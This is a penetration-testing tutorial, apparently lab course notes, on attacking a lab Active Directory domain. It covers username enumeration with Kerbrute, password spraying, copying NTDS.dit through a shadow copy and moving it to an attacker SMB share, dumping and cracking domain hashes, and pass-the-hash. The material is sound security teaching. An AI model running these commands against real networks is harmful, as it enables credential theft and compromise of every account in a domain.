# Attacking Active Directory & NTDS.dit

## Table of Contents

- [1. Guessing valid usernames](#1-guessing-valid-usernames)
- [2. Enumerating valid usernames with Kerbrute](#2-enumerating-valid-usernames-with-kerbrute)
- [3. Password spraying with NetExec](#3-password-spraying-with-netexec)
- [4. Capturing NTDS.dit](#4-capturing-ntdsdit)
- [5. Extracting hashes from NTDS.dit](#5-extracting-hashes-from-ntdsdit)
  - [Method A: secretsdump (manual, two-step process)](#method-a-secretsdump-manual-two-step-process)
  - [Method B: NetExec (does the whole thing in one command)](#method-b-netexec-does-the-whole-thing-in-one-command)
- [6. Cracking the recovered hashes](#6-cracking-the-recovered-hashes)
- [What if a hash won't crack? Pass-the-Hash (PtH)](#what-if-a-hash-wont-crack-pass-the-hash-pth)

---

## Why Active Directory matters so much

If an organization runs Windows, odds are extremely high they're also running **Active Directory (AD)** — it's the backbone used to centrally manage users, computers, and permissions across the whole network. AD is such a big topic it gets entire dedicated modules elsewhere — here we're focusing specifically on **guessing domain credentials** and **extracting the master hash database (NTDS.dit)**.

### A quick note on network access

Everything in this guide assumes you're already sitting *inside* the internal network somehow — most of these attacks target machines that aren't directly reachable from the open internet. (Occasionally an org exposes something like RDP directly through port forwarding, but that's the exception, not the rule.)

### What changes once a machine joins a domain

Before a computer joins a domain, logins get checked against its own local **SAM** database. Once it's domain-joined, logins instead get forwarded to a **Domain Controller** for verification. Important nuance: **SAM doesn't stop existing** — you can still log in with a purely local account by specifying it explicitly:

```
WS01\nameofuser
```
or, sitting at the machine directly, typing `.\` before the username at the login screen.

This matters because it gives you two separate attack surfaces to think about on any given machine — the local SAM accounts *and* the domain accounts it trusts.

Keep in mind that we can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/).

---

## 1. Guessing valid usernames

A **dictionary attack** against AD means systematically trying combinations of usernames and passwords. Doing this blindly across a network is noisy — it generates lots of login attempts, which shows up in logs and can trip account lockout policies. So it pays to narrow things down *before* you start guessing.

### Finding real employee names

Social media and a company's own "About Us"/employee directory pages are great sources for real names. Once you have names, the next problem is figuring out the **username format** the organization actually uses:

| Convention | Example for "Jane Jill Doe" |
|------------|---------------------------------|
| First initial + last name | `jdoe` |
| First + middle initial + last name | `jjdoe` |
| Full first + last name | `janedoe` |
| First.Last | `jane.doe` |
| Last.First | `doe.jane` |
| Nickname-based | `doedoehacksstuff` |

**Tip:** Email addresses often reveal the username pattern directly — if you spot `jdoe@company.com` somewhere (easy to find with a quick search for `"@company.com"`), you now know `jdoe` is a valid username format.

Some organizations deliberately **obfuscate** real usernames (e.g., emails route through an alias like `a907@company.com` that maps internally to `joe.smith`) specifically to make spraying harder. In those cases, metadata tricks can still help — Google dorks like `site:company.com filetype:pdf` sometimes surface documents whose file properties (author field, etc.) leak a real internal username, giving you a format to work from.

### Building a custom username list automatically with Username Anarchy

Say research turned up these names:
```
Ben Williamson
Bob Burgerstien
Jim Stevenson
Jill Johnson
Jane Doe
```

Rather than typing every variant by hand, **Username Anarchy** (covered earlier) converts a names file into dozens of likely formats automatically:

```bash
$ ./username-anarchy -i names.txt
```
```
ben
benwilliamson
ben.williamson
b.williamson
bwilliamson
williamson.ben
...
```

Automation saves time, but it's still worth investing effort to actually *discover* the real naming convention where possible — fewer guesses means less noise and fewer wasted login attempts.

---

## 2. Enumerating valid usernames with Kerbrute

Before spending time guessing passwords for usernames that might not even exist, **Kerbrute** can quickly check which ones are valid by abusing how Kerberos pre-authentication responds differently for real vs. fake accounts — no password guessing involved yet, just username validation.

```bash
$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ / ___/ __ / ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```

This confirms `bwilliamson` is a real account before you waste time password-guessing against a username that doesn't even exist.

---

## 3. Password spraying with NetExec

With a trimmed, confirmed username list in hand, you can attempt actual logins against the Domain Controller over SMB:

```bash
$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

```
[-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE
[-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE
[-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE
[+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

Success — a valid password found on the fifth-ish attempt.

> **Lockout risk:** if the organization enforces an account lockout policy, repeated failed attempts like this can lock the targeted account. Interestingly, Windows domains don't enforce a lockout policy by default out of the box — meaning plenty of real-world environments are still vulnerable to exactly this kind of attack if an admin never explicitly configured one.

> **Leaves a trail:** every attempt like this gets logged in Windows' Security Event Log, which is exactly what defenders (and post-engagement remediation reports) would review afterward.

---

## 4. Capturing NTDS.dit

**NTDS.dit** is the Active Directory equivalent of SAM, but scaled up to the entire domain — it contains every domain username, password hash, and other schema data. It lives at:
```
%systemroot%\ntds\NTDS.dit
```
on the Domain Controller. If you can capture this file (and the matching SYSTEM hive), you could potentially compromise **every account in the domain at once** — the same underlying technique as dumping SAM, just at domain scale.

### Connecting with the credentials you found

```bash
$ evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

### Checking what privileges you actually have

Capturing NTDS.dit requires either **local Administrator** rights on the DC, or being a **Domain Admin** (or equivalent). So the next step is checking:

```powershell
*Evil-WinRM* PS C:\> net localgroup
```
(lists local groups on the box — you're looking to see if your account is in `Administrators`)
```
Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
...
...
```

```powershell
*Evil-WinRM* PS C:\> net user bwilliamson
```
```
Global Group memberships     *Domain Users         *Domain Admins
```

This account is a **Domain Admin** — effectively unrestricted access across the whole domain, including the ability to pull NTDS.dit.

### Using a Volume Shadow Copy to grab a locked file

NTDS.dit is constantly in use by the Domain Controller, so you can't just copy it directly. The workaround: create a **Volume Shadow Copy (VSS)** — a point-in-time snapshot of the drive, the same mechanism backup software uses to safely copy files that are actively in use.

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
```
Successfully created shadow copy for 'C:\'
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

Then copy NTDS.dit out of that frozen snapshot:

```powershell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

### Transferring it off the DC

Same SMB-share trick from the SAM/SECURITY guide — stand up a share on your attack machine, then move the file over:

```powershell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

> **Don't forget SYSTEM:** just like with SAM, the hashes inside NTDS.dit are encrypted using a key stored in the `SYSTEM` registry hive. You need **both files** to actually decrypt anything.

---

## 5. Extracting hashes from NTDS.dit

### Method A: secretsdump (manual, two-step process)

```bash
$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```
[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
```

### Method B: NetExec (does the whole thing in one command)

Rather than manually creating the shadow copy, transferring the file, and running secretsdump yourself, NetExec's `ntdsutil` module automates the entire workflow remotely:

```bash
$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

```
[+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
[*] Dumping ntds with ntdsutil.exe...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[+] Dumped 61 NTDS hashes to .../DC01_10.129.201.57_...ntds
```

This dumps every domain account's NT hash (plus bonus Kerberos key material) in one go — far faster than the manual multi-step process.

---

## 6. Cracking the recovered hashes

Same Hashcat workflow as every other section:

```bash
$ hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
```
64f12cddaa88057e06a81b54e73b949b:Password1
```

---

## What if a hash won't crack? Pass-the-Hash (PtH)

Not every hash cracks — strong, random passwords can be effectively uncrackable in any realistic timeframe. But there's a clever workaround: Windows' NTLM authentication protocol doesn't actually require the *plaintext* password to log in — it just needs the **hash**. So you can authenticate using `username:hash` instead of `username:password`, completely skipping the cracking step.

```bash
$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

This is called **Pass-the-Hash (PtH)**, and it's an extremely common technique for moving laterally across a network once you've captured even one usable hash — no cracking required at all.

---

## Quick Recap

| Step | Tool | Purpose |
|------|------|---------|
| Guess usernames | Manual research / Username Anarchy | Build a realistic username list |
| Confirm real accounts | Kerbrute | Filter out usernames that don't actually exist |
| Spray passwords | NetExec | Find a working username/password pair |
| Capture NTDS.dit | `vssadmin` + manual copy, or NetExec `-M ntdsutil` | Pull the domain-wide hash database off the DC |
| Extract hashes | `secretsdump.py` (with SYSTEM hive) | Decrypt NTDS.dit into crackable hashes |
| Crack hashes | Hashcat | Recover plaintext passwords |
| If cracking fails | Pass-the-Hash | Authenticate using the hash directly, no plaintext needed |

**Key idea:** NTDS.dit is SAM's domain-wide big sibling — same underlying dependency on a SYSTEM-derived key, same general extraction workflow, just affecting every account in the organization instead of one machine. And when cracking fails outright, Pass-the-Hash means a captured hash is still immediately useful for lateral movement, even without ever recovering the plaintext.
